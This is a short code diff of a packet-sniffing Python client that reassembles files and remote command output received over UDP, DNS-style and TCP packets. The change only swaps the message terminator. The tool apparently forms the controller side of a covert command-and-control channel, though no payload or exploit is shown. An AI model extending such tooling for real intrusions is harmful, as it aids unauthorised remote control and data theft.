@@ -101,21 +101,21 @@ class Client:
             # Handles files
             if IP in packet and packet[IP].src in self.whitelist \
                     and packet[UDP].dport == self.recv_port and packet[UDP].sport == self.file_port:
-                msg = packet[UDP].load
+                data = packet[UDP].load
 
-                if b'\x00' in msg:
-                    filename = msg.split(b'\x00')[0]
+                if b'|||' in data:
+                    filename = data.split(b'|||')[0]
                     filename = filename.decode()
                     print("UDP/DNS Terminator received....")
                     self.combine_bits(filename)
                     self.file_bits = []
                 else:
-                    self.file_bits.append(msg)
+                    self.file_bits.append(data)
 
             # Handles response of executed commands
             if UDP in packet and packet[UDP].dport == self.recv_port:
                 data = packet[Raw].load
-                if b'\x00' in data:
+                if b'|||' in data:
                     print("Terminator received....")
                     self.combine_bits("")
                     self.cmd_bits = []
@@ -132,8 +132,8 @@ class Client:
             print(f"received data from whitelisted ip: {packet[IP].src}")
             if Raw in packet:
                 data = packet[Raw].load
-                if b'\x00' in data:
-                    filename = data.split(b'\x00')[0]
+                if b'|||' in data:
+                    filename = data.split(b'|||')[0]
                     filename = filename.decode()
                     print("Terminator received....")
                     self.combine_bits(filename)
@@ -146,7 +146,7 @@ class Client:
         try:
             if TCP in packet and Raw in packet and packet[TCP].dport == self.recv_port:
                 data = packet[Raw].load
-                if b'\x00' in data:
+                if b'|||' in data:
                     print("Terminator received....")
                     self.combine_bits("")
                     self.cmd_bits = []
